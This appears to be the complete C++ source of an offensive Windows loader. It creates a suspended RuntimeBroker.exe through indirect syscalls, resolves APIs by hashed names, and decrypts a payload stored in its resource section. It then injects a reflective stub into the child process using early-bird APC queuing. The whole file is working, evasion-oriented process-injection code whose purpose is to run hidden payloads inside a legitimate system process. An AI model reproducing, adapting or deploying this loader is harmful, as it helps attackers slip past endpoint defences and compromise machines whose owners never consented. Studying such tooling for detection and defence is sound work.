#include "Main.hpp"


// Compile-time hashes
CREATEHASHA(GetWindowsDirectoryW);
CREATEHASHA(RtlCreateProcessParametersEx);
CREATEHASHA(FindResourceW);
CREATEHASHA(LoadResource);
CREATEHASHA(LockResource);
CREATEHASHA(SizeofResource);
CREATEHASHW(ntdll);
CREATEHASHW(KERNEL32);



bool EarlyBird(void* RemotePayload, HANDLE hMainThread) {
	
	NTSTATUS status = ERROR_SUCCESS;

	status = IndirectSyscalls::NtQueueApcThread(
		hMainThread,
		RemotePayload,
		nullptr,
		nullptr,
		nullptr
	);
	
	if (status != ERROR_SUCCESS) {
		std::cout << "NtQueueApcThread failed: " << std::hex << status << std::endl;
		return false;
	}

	
	status = IndirectSyscalls::NtResumeThread(hMainThread, nullptr);

	if (status != ERROR_SUCCESS) {
		std::cout << "NtResumeThread Failed:" << std::hex << status << std::endl;
		return false;
	}
	
	return true;
}



bool CreateSuspendedProcess
		(_In_ HANDLE Parent,
		_Out_ HANDLE* hProcess, 
		_Out_ HANDLE* hMainThread, 
		const wchar_t* ImageName, 
		const wchar_t* CommandLine,
		const wchar_t* CurrentDirectory) {

	

	PPS_ATTRIBUTE_LIST pAttributeList = nullptr;
	PS_CREATE_INFO CreateInfo = { 0 };
	DWORD64 BlockDllPolicy = DLL_MITIGATION_POLICY;
	fnRtlCreateProcessParametersEx pCreateProcessParams = nullptr;

	UNICODE_STRING usImageName = { 0 };
	UNICODE_STRING usCommandLine = { 0 };
	UNICODE_STRING usCurrentDirectory = { 0 };

	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = nullptr;
	NTSTATUS status = ERROR_SUCCESS;



	/* Initialize Unicode Strings */
	_RtlInitUnicodeString(&usImageName, ImageName);
	_RtlInitUnicodeString(&usCommandLine, CommandLine);
	_RtlInitUnicodeString(&usCurrentDirectory, CurrentDirectory);



	/* Create Process Parameters */
	pCreateProcessParams = reinterpret_cast<fnRtlCreateProcessParametersEx>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(ntdll_compHashedW), RtlCreateProcessParametersEx_compHashedA));

	if (pCreateProcessParams == nullptr)
		return false;


	status = pCreateProcessParams(
		&pProcessParameters,
		&usImageName,
		nullptr,
		&usCurrentDirectory,
		&usCommandLine,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);

	if (status != ERROR_SUCCESS)
		return false;




	/* Create Attribute List */
	pAttributeList = static_cast<PPS_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST)));
	if (!pAttributeList)
		return false;


	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = usImageName.Length;
	pAttributeList->Attributes[0].Value = (ULONG_PTR)usImageName.Buffer;


	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size = sizeof(DWORD64);
	pAttributeList->Attributes[1].Value = (ULONG_PTR)&BlockDllPolicy;



	/* Create Process */
	CreateInfo.Size = sizeof(PS_CREATE_INFO);
	CreateInfo.State = PsCreateInitialState;

	status = 0x00;
	status = IndirectSyscalls::NtCreateUserProcess(
		hProcess,
		hMainThread,
		PROCESS_ALL_ACCESS,
		THREAD_ALL_ACCESS,
		nullptr,
		nullptr,
		PROCESS_CREATE_FLAGS_SUSPENDED,
		THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
		pProcessParameters,
		&CreateInfo,
		pAttributeList
	);

	if (status != ERROR_SUCCESS) {
		std::cout << "Status: 0x" << std::hex << status << std::endl;
	}


	HeapFree(GetProcessHeap(), 0, pAttributeList);
	return (status == ERROR_SUCCESS);
}



std::array<std::wstring, 3> ConstructProcessArguments() {

	fnGetWindowsDirectoryW pGetWindowsDirectoryW = nullptr;
	wchar_t Buffer[MAX_PATH] = { 0 }; //C:Windows
	std::wstring WindowsPath;
	std::array<std::wstring, 3> ProcessArguments = {L"\\??\\", L"", L""};



	pGetWindowsDirectoryW = reinterpret_cast<fnGetWindowsDirectoryW>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), GetWindowsDirectoryW_compHashedA));

	if (pGetWindowsDirectoryW == nullptr) {
		return ProcessArguments;
	}

	if (!pGetWindowsDirectoryW(Buffer, MAX_PATH)) {
		return ProcessArguments;
	}



	WindowsPath = Buffer;
	ProcessArguments[INDEX_IMAGENAME] += WindowsPath + L"\\System32\\RuntimeBroker.exe";
	ProcessArguments[INDEX_COMMANDLINE] = WindowsPath + L"\\System32\\RuntimeBroker.exe -Embedding";
	ProcessArguments[INDEX_CURRENT_DIRECTORY] = WindowsPath + L"\\System32";

	return ProcessArguments;
}




void* WritePayload(HANDLE hProcess, void* Local, size_t PayloadSize) {

	size_t PageBoundary = PayloadSize;
	void* PageBase = nullptr;
	NTSTATUS status = ERROR_SUCCESS;
	size_t BytesWritten = 0;
	std::uint32_t OldProtect = 0;



	status = IndirectSyscalls::NtAllocateVirtualMemory(
		hProcess,
		&PageBase,
		0,
		&PageBoundary,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (status != ERROR_SUCCESS) {
		std::cout << "NtAllocateVirtualMem failed\n";
		return nullptr;
	}



	status = IndirectSyscalls::NtWriteVirtualMemory(
		hProcess,
		PageBase,
		Local,
		PayloadSize,
		&BytesWritten
	);

	if (status != ERROR_SUCCESS || BytesWritten != PayloadSize) {
		std::cout << "NtWriteVirtualMEmory faield\n";
		return nullptr;
	}


	
	status = IndirectSyscalls::NtProtectVirtualMemory(
		hProcess,
		&PageBase,
		&PayloadSize,
		PAGE_EXECUTE_READ,
		(PULONG)&OldProtect
	);

	if (status != ERROR_SUCCESS) {
		std::cout << "NtProtectMemory failed.\n";
		return nullptr;
	}

	return PageBase;
}



bool GetPayloadPointer(void*& PayloadPtr, size_t& Size) {

	HRSRC hRsrc = 0;
	HGLOBAL hGlobal = 0;
	void* PayloadAddress = nullptr;
	size_t PayloadSize = 0;



	fnFindResourceW pFindResourceW = static_cast<fnFindResourceW>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), FindResourceW_compHashedA));
	
	fnLoadResource pLoadResource = static_cast<fnLoadResource>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), LoadResource_compHashedA));

	fnLockResource pLockResource = static_cast<fnLockResource>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), LockResource_compHashedA));

	fnSizeofResource pSizeofResource = static_cast<fnSizeofResource>\
		(GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), SizeofResource_compHashedA));


	if (!pFindResourceW || !pLoadResource || !pLockResource || !pSizeofResource)
		return false;



	hRsrc = pFindResourceW(nullptr, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (!hRsrc)
		return false;
	
	hGlobal = pLoadResource(nullptr, hRsrc);
	if (!hGlobal)
		return false;

	PayloadAddress = pLockResource(hGlobal);
	if (PayloadAddress == nullptr)
		return false;

	PayloadSize = pSizeofResource(nullptr, hRsrc);
	if (!PayloadSize)
		return false;



	Size = PayloadSize;
	PayloadPtr = PayloadAddress;
	return true;
}



int main() {
	
	//
	// Initialize indirect syscalls and set up process arguments
	//

	std::cout << "{+} Initializing..." << std::endl;
	if (!IndirectSyscalls::Initialize()) {
		return -1;
	}

	std::array<std::wstring, 3> ProcessArguments(std::move(ConstructProcessArguments()));



	//
	// Create suspended child process via NtCreateUserProcess
	//

	HANDLE hProcess = nullptr;
	HANDLE hThread = nullptr;
	
	std::cout << "{+} Creating Sacrificial Child Process..." << std::endl;
	if (!CreateSuspendedProcess(
		GetCurrentProcess(),
		&hProcess,
		&hThread,
		ProcessArguments[INDEX_IMAGENAME].c_str(),
		ProcessArguments[INDEX_COMMANDLINE].c_str(),
		ProcessArguments[INDEX_CURRENT_DIRECTORY].c_str()
		)) {

		return -1;
	}

	std::cout << "{+} Created Child Process With PID: " << GetProcessId(hProcess) << "\n\n";



	//
	// Retrieve Payload from .rsrc section
	//

	void* pPayload = nullptr;
	size_t PayloadSize = 0;

	if (!GetPayloadPointer(pPayload, PayloadSize))
		return -1;

	std::cout << "{+} Retrieved Payload From .rsrc section: 0x" << pPayload << std::endl;



	//
	// Copy and decrypt
	//

	std::cout << "{+} Decrypting Payload..." << std::endl;

	void* pHeapBuffer = HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		PayloadSize
	);

	if (pHeapBuffer == nullptr)
		return -1;

	memcpy(pHeapBuffer, pPayload, PayloadSize);
	Decrypt((byte*)pHeapBuffer, PayloadSize);



	//
	// Retrieve reflective stub offset
	//

	std::cout << "{+} Calculating Offset Of Reflective Stub..." << "\n\n";
	std::uint32_t StubOffset = getReflectiveFunctionRawOffset((byte*)pHeapBuffer, REFLECTIVE_FUNCTION);
	if (!StubOffset)
		return -1;



	//
	// Perform early bird injection
	//
	
	std::cout << "{+} Performing Early Bird Injection..." << "\n\n";
	byte* Remote = static_cast<byte*>(WritePayload(hProcess, pHeapBuffer, PayloadSize));
	if (Remote == nullptr)
		return -1;

	if (!EarlyBird(Remote + StubOffset, hThread))
		return -1;


	std::cout << "\n{+} Finished. Press <ENTER> To Exit..." << std::endl;
	std::cin.get();

	HeapFree(GetProcessHeap(), 0, pHeapBuffer);
	return 0;
}